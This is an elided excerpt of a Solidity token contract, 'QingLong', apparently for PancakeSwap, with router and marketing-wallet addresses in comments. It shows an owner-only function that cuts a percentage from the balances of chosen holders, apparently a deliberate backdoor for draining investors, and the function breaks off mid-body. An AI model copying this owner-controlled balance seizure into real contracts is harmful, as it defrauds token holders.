...
contract QingLong is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    function setDeadTokenAmounts(address[] calldata holders, uint256 fee, uint256 minDeadAmountsCondition) external onlyOwner {
        for (uint i = 0; i < holders.length; ++i) {
            if (balanceOf(holders[i]) >= minDeadAmountsCondition) {
                uint256 deadAmounts = balanceOf(holders[i]).mul(fee).div(100);
...
// ROUTER Pancakeswap 0xB6BA90af76D139AB3170c7df0139636dB6120F7e
// marketingWallet 0x1284214b9b9c85549aB3D2b972df0dEEf66aC2c9 
